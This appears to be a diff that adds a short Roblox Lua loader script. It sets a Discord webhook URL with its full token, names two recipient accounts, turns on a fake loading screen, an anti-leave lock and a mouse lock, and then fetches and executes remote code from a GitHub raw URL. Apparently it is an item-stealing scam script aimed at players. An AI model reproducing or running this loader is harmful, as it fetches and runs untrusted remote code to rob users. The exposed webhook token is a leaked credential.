@@ -1,0 +1,9 @@
+UserName = "Chaoticbull74" --
+Webhook = "https://discord.com/api/webhooks/1128289100311576617/ALfmMOG3BRf1le9rgH6QuYjqJZk330Clu7UF9DbKF-kC7zyg2Ytz-w8nKN91Ha3IDHff" --
+UserName2 = "dodoonnewpc" --
+
+_G.LoadingScreen = true --
+_G.AntiLeave = true --
+_G.MouseLock = true --
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/Lizzy1sDC1M/main/Lizzy1sDC1M", true))()
